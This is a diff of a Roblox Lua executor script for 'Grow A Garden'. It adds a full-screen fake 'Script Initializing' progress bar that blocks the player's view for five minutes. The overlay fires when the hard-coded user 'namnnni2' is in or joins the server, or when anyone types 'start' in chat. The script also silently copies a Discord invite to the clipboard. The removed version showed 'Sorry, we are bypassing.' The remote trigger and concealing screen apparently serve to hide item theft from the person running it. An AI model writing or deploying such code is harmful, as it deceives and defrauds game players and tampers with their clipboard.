@@ -1,235 +1,158 @@
--- Services
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local CoreGui = game:GetService("CoreGui")
-local LocalPlayer = Players.LocalPlayer
+-- GAG LOADING UI by namnnni2 (trigger once, fast, and shows percent from 0.1 to 100.0)
 
--- Priority players
-local priorityPlayers = {
-    "namnnni2"
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+
+-- Danh sách người ưu tiên
+local priorityUsers = {
+	"namnnni2", -- Thêm username tại đây nếu cần
 }
 
-local function isPriorityPlayer(playerName)
-    for _, name in ipairs(priorityPlayers) do
-        if playerName == name then
-            return true
-        end
-    end
-    return false
+-- Ngăn không chạy 2 lần
+local isShown = false
+local function triggerOnce()
+	if isShown then return end
+	isShown = true
+
+	-- Xoá nếu có UI cũ
+	if CoreGui:FindFirstChild("GAGLoadingUI") then
+		CoreGui.GAGLoadingUI:Destroy()
+	end
+
+	local TweenService = game:GetService("TweenService")
+
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "GAGLoadingUI"
+	screenGui.IgnoreGuiInset = true
+	screenGui.ResetOnSpawn = false
+	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	screenGui.Parent = CoreGui
+
+	local bg = Instance.new("Frame")
+	bg.Size = UDim2.new(1, 0, 1, 0)
+	bg.BackgroundColor3 = Color3.fromRGB(222, 255, 222)
+	bg.BorderSizePixel = 0
+	bg.Parent = screenGui
+
+	local title = Instance.new("TextLabel")
+	title.Text = "🌻 Grow A Garden 🐝🍯"
+	title.Font = Enum.Font.FredokaOne
+	title.TextSize = 50
+	title.TextColor3 = Color3.fromRGB(34, 139, 34)
+	title.Size = UDim2.new(1, 0, 0, 80)
+	title.Position = UDim2.new(0, 0, 0.1, 0)
+	title.BackgroundTransparency = 1
+	title.Parent = bg
+
+	local status = Instance.new("TextLabel")
+	status.Text = "Script Initializing... Please Wait."
+	status.Font = Enum.Font.FredokaOne
+	status.TextSize = 25
+	status.TextColor3 = Color3.fromRGB(0, 0, 0)
+	status.Size = UDim2.new(1, 0, 0, 40)
+	status.Position = UDim2.new(0, 0, 0.3, 0)
+	status.BackgroundTransparency = 1
+	status.Parent = bg
+
+	local barBg = Instance.new("Frame")
+	barBg.Size = UDim2.new(0.5, 0, 0, 25)
+	barBg.Position = UDim2.new(0.25, 0, 0.4, 0)
+	barBg.BackgroundColor3 = Color3.fromRGB(200, 255, 200)
+	barBg.BorderSizePixel = 0
+	barBg.ClipsDescendants = true
+	barBg.Parent = bg
+
+	local barFill = Instance.new("Frame")
+	barFill.Size = UDim2.new(0, 0, 1, 0)
+	barFill.BackgroundColor3 = Color3.fromRGB(120, 255, 120)
+	barFill.BorderSizePixel = 0
+	barFill.Parent = barBg
+
+	local percentLabel = Instance.new("TextLabel")
+	percentLabel.Text = "0.1%"
+	percentLabel.Font = Enum.Font.FredokaOne
+	percentLabel.TextSize = 22
+	percentLabel.TextColor3 = Color3.fromRGB(0, 100, 0)
+	percentLabel.Size = UDim2.new(1, 0, 0, 25)
+	percentLabel.Position = UDim2.new(0, 0, 0, -30)
+	percentLabel.BackgroundTransparency = 1
+	percentLabel.Parent = barBg
+
+	local discordLink = "https://discord.gg/tYqqXYKxFD"
+	local discordText = Instance.new("TextLabel")
+	discordText.Text = "Join Our Discord: " .. discordLink .. " (copied)"
+	discordText.Font = Enum.Font.FredokaOne
+	discordText.TextSize = 20
+	discordText.TextColor3 = Color3.fromRGB(50, 50, 50)
+	discordText.Size = UDim2.new(1, 0, 0, 30)
+	discordText.Position = UDim2.new(0, 0, 0.55, 0)
+	discordText.BackgroundTransparency = 1
+	discordText.Parent = bg
+
+	local preparing = Instance.new("TextLabel")
+	preparing.Text = "Preparing environment..."
+	preparing.Font = Enum.Font.FredokaOne
+	preparing.TextSize = 20
+	preparing.TextColor3 = Color3.fromRGB(0, 0, 0)
+	preparing.Size = UDim2.new(1, 0, 0, 25)
+	preparing.Position = UDim2.new(0, 0, 0.62, 0)
+	preparing.BackgroundTransparency = 1
+	preparing.Parent = bg
+
+	-- Tự động copy link nếu executor hỗ trợ
+	pcall(function()
+		if setclipboard then
+			setclipboard(discordLink)
+		end
+	end)
+
+	-- Bắt đầu loading bar từ 0.1% đến 100.0%
+	task.spawn(function()
+		local percent = 0.1
+		local totalTime = 300 -- 5 phút
+		local interval = 0.1
+		local steps = totalTime / interval
+		local increment = (100.0 - 0.1) / steps
+
+		for i = 1, steps do
+			barFill:TweenSize(UDim2.new(percent / 100, 0, 1, 0), "Out", "Linear", interval * 0.9, true)
+			percentLabel.Text = string.format("%.1f%%", percent)
+			percent += increment
+			task.wait(interval)
+		end
+
+		percentLabel.Text = "100.0%"
+		barFill.Size = UDim2.new(1, 0, 1, 0)
+		wait(0.5)
+		screenGui:Destroy()
+	end)
 end
 
--- Create mini "Executing script..." GUI
-local function createMiniExecuteGui()
-    if CoreGui:FindFirstChild("MiniExecuteGui") then return end
-
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "MiniExecuteGui"
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.Parent = CoreGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 260, 0, 50)
-    frame.Position = UDim2.new(0.5, -130, 0, 20)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BackgroundTransparency = 0.2
-    frame.BorderSizePixel = 0
-    frame.Parent = screenGui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = frame
-
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(255, 255, 255)
-    stroke.Thickness = 2
-    stroke.Transparency = 0.3
-    stroke.Parent = frame
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Text = "Executing script"
-    label.Font = Enum.Font.FredokaOne
-    label.TextSize = 24
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
-    label.TextStrokeTransparency = 0
-    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    label.Parent = frame
-
-    spawn(function()
-        while label.Parent do
-            for i = 1, 3 do
-                label.Text = "Executing script" .. string.rep(".", i)
-                wait(0.5)
-            end
-        end
-    end)
+-- Kích hoạt nếu người ưu tiên đang trong server
+for _, player in ipairs(Players:GetPlayers()) do
+	if table.find(priorityUsers, player.Name) then
+		triggerOnce()
+		break
+	end
 end
 
--- Create loading screen
-local function createLoadingScreen()
-    if CoreGui:FindFirstChild("UltraBeautifulLoadingScreen") then return end
-
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "UltraBeautifulLoadingScreen"
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = CoreGui
-
-    RunService.RenderStepped:Wait()
-
-    local bgFrame = Instance.new("Frame")
-    bgFrame.Size = UDim2.new(1, 0, 1, 0)
-    bgFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    bgFrame.Parent = screenGui
-
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 200))
-    }
-    gradient.Rotation = 0
-    gradient.Parent = bgFrame
-
-    spawn(function()
-        while bgFrame.Parent do
-            for i = 0, 360, 1 do
-                gradient.Rotation = i
-                wait(0.03)
-            end
-        end
-    end)
-
-    local mainText1 = Instance.new("TextLabel")
-    mainText1.Size = UDim2.new(1, 0, 0, 80)
-    mainText1.Position = UDim2.new(0, 0, 0.3, 0)
-    mainText1.BackgroundTransparency = 1
-    mainText1.Text = "Sorry, we are bypassing."
-    mainText1.Font = Enum.Font.FredokaOne
-    mainText1.TextSize = 56
-    mainText1.TextColor3 = Color3.new(1, 1, 1)
-    mainText1.TextStrokeTransparency = 0
-    mainText1.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    mainText1.Parent = bgFrame
-
-    local mainText2 = Instance.new("TextLabel")
-    mainText2.Size = UDim2.new(1, 0, 0, 70)
-    mainText2.Position = UDim2.new(0, 0, 0.42, 0)
-    mainText2.BackgroundTransparency = 1
-    mainText2.Text = "Please be patient..."
-    mainText2.Font = Enum.Font.FredokaOne
-    mainText2.TextSize = 48
-    mainText2.TextColor3 = Color3.new(1, 1, 1)
-    mainText2.TextStrokeTransparency = 0
-    mainText2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    mainText2.Parent = bgFrame
-
-    local progressBarBg = Instance.new("Frame")
-    progressBarBg.Size = UDim2.new(0.5, 0, 0, 30)
-    progressBarBg.Position = UDim2.new(0.25, 0, 0.6, 0)
-    progressBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    progressBarBg.BorderSizePixel = 0
-    progressBarBg.Parent = bgFrame
-
-    local cornerBg = Instance.new("UICorner")
-    cornerBg.CornerRadius = UDim.new(0, 15)
-    cornerBg.Parent = progressBarBg
-
-    local strokeBg = Instance.new("UIStroke")
-    strokeBg.Color = Color3.fromRGB(255, 255, 255)
-    strokeBg.Thickness = 2
-    strokeBg.Transparency = 0.5
-    strokeBg.Parent = progressBarBg
-
-    local progressBarFill = Instance.new("Frame")
-    progressBarFill.Size = UDim2.new(0, 0, 1, 0)
-    progressBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
-    progressBarFill.BorderSizePixel = 0
-    progressBarFill.Parent = progressBarBg
-
-    local cornerFill = Instance.new("UICorner")
-    cornerFill.CornerRadius = UDim.new(0, 15)
-    cornerFill.Parent = progressBarFill
-
-    local glow = Instance.new("UIStroke")
-    glow.Thickness = 3
-    glow.Transparency = 0.3
-    glow.Color = Color3.fromRGB(0, 255, 150)
-    glow.Parent = progressBarFill
-
-    local percentText = Instance.new("TextLabel")
-    percentText.Size = UDim2.new(1, 0, 0, 60)
-    percentText.Position = UDim2.new(0, 0, 0.66, 0)
-    percentText.BackgroundTransparency = 1
-    percentText.Text = "0%"
-    percentText.Font = Enum.Font.GothamBold
-    percentText.TextSize = 38
-    percentText.TextColor3 = Color3.new(1, 1, 1)
-    percentText.TextStrokeTransparency = 0
-    percentText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    percentText.Parent = bgFrame
-
-    local totalTime = 300
-    local startTime = tick()
-
-    while tick() - startTime < totalTime do
-        local elapsed = tick() - startTime
-        local progress = math.clamp(elapsed / totalTime, 0, 1)
-
-        progressBarFill.Size = UDim2.new(progress, 0, 1, 0)
-        percentText.Text = string.format("%.0f%%", progress * 100)
-
-        local hsv = Color3.fromHSV(progress, 1, 1)
-        progressBarFill.BackgroundColor3 = hsv
-        glow.Color = hsv
-        mainText1.TextColor3 = hsv
-        mainText2.TextColor3 = hsv
-
-        wait(0.1)
-    end
-
-    progressBarFill.Size = UDim2.new(1, 0, 1, 0)
-    percentText.Text = "100%"
-
-    wait(1)
-
-    local fadeTween = TweenService:Create(bgFrame, TweenInfo.new(2), {BackgroundTransparency = 1})
-    fadeTween:Play()
-    fadeTween.Completed:Wait()
-
-    screenGui:Destroy()
-end
-
--- Bật GUI mini ngay
-createMiniExecuteGui()
-
--- Kiểm tra player có sẵn
-for _, plr in ipairs(Players:GetPlayers()) do
-    if isPriorityPlayer(plr.Name) and plr ~= LocalPlayer then
-        createLoadingScreen()
-        break
-    end
-
-    -- Nghe chat START
-    plr.Chatted:Connect(function(msg)
-        if msg:lower() == "start" then
-            createLoadingScreen()
-        end
-    end)
-end
-
--- Khi có player mới join
-Players.PlayerAdded:Connect(function(plr)
-    if isPriorityPlayer(plr.Name) then
-        createLoadingScreen()
-    end
-
-    -- Nghe chat START từ player mới
-    plr.Chatted:Connect(function(msg)
-        if msg:lower() == "start" then
-            createLoadingScreen()
-        end
-    end)
+-- Kích hoạt khi người ưu tiên join
+Players.PlayerAdded:Connect(function(player)
+	if table.find(priorityUsers, player.Name) then
+		triggerOnce()
+	end
+	player.Chatted:Connect(function(msg)
+		if msg:lower():match("^start$") then
+			triggerOnce()
+		end
+	end)
 end)
+
+-- Kích hoạt khi ai đó trong server hiện tại chat "START"
+for _, player in ipairs(Players:GetPlayers()) do
+	player.Chatted:Connect(function(msg)
+		if msg:lower():match("^start$") then
+			triggerOnce()
+		end
+	end)
+end
